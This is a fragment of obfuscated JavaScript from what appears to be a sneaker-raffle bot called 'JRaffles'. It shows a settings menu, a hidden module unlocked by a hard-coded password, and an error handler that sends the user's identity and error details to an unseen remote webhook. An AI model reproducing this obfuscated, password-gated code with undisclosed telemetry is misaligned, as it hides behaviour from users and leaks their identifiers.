                                                                            console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x5b76e0 + '\x20:'), _0x8702f0[_0x5b76e0] = await _0x6989c2(), _0x40e0db['writeFileSync']('../settings.json', JSON['stringify'](_0x8702f0));
                                                                            break;
                                                                        } else
                                                                            _0xe0b0f2++;
                                                                    }
                                                                    return console['log']('Settings\x20Saved!'), await _0x7e80ad(0xbb8), _0x1c3dd4();
                                                                } else {
                                                                    if (_0x48b703[taskModule]['name'] == 'Reload\x20Settings')
                                                                        return console['log']('Reloading\x20settings'), await _0x24032f(), _0x1c3dd4();
                                                                    else {
                                                                        if (taskModule == 0x45) {
                                                                            _0x48b703[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                            var _0x3a8247 = await _0x29ac51();
                                                                            _0x3a8247 == 'ModuleVoorDeBoys' ? (await _0x583d7c(), await _0x14cf08(), await afewFunction(_0x4c7975[_0x336206], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x7e80ad(0xbb8));
                                                                        } else {
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            await _0x1c3dd4();
        } catch (_0x10419b) {
            return console['log'](_0x10419b), await _0x7e80ad(0x3a98);
        }
}
;
_0x16d703('JRaffles\x20' + _0x4a89e9), _0x24032f();
try {
    _0x21940f();
} catch (_0x6ce9cf) {
    var _0x3275f7 = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x397af7
            },
            {
                'name': 'Version',
                'value': '' + _0x4a89e9
            },
            {
                'name': 'Error',
                'value': '' + _0x6ce9cf
            }
        ]
    }];
    const _0x58a5f8 = { 'embeds': _0x3275f7 };
    _0x10a0d6(_0x5cf6ec, _0x58a5f8);
}